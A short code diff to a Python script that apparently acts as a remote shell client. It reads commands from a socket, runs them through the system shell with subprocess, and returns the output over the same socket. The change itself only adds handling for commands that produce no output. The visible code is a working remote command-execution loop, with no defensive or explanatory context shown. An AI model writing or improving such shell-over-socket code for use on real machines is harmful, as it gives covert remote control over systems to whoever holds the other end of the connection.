@@ -24,8 +24,12 @@ def main():
                 print("Non-cd command")
                 print(cwd)
                 output = subprocess.Popen(split_command, stdout=subprocess.PIPE, cwd=cwd, shell=True).communicate()[0]
-                main_socket.sendall(output)
-            elif len(split_command) > 1 and split_command[0] == 'cd':
+                if output.decode() != '':
+                    main_socket.sendall(output)
+                else:  # for commands with no output
+                    main_socket.sendall("don't_display".encode())
+
+            elif (len(split_command) > 1) and split_command[0] == 'cd':
                 print("normal cd command")
                 # update the current working directory and update the global variable
                 os.chdir(split_command[1])
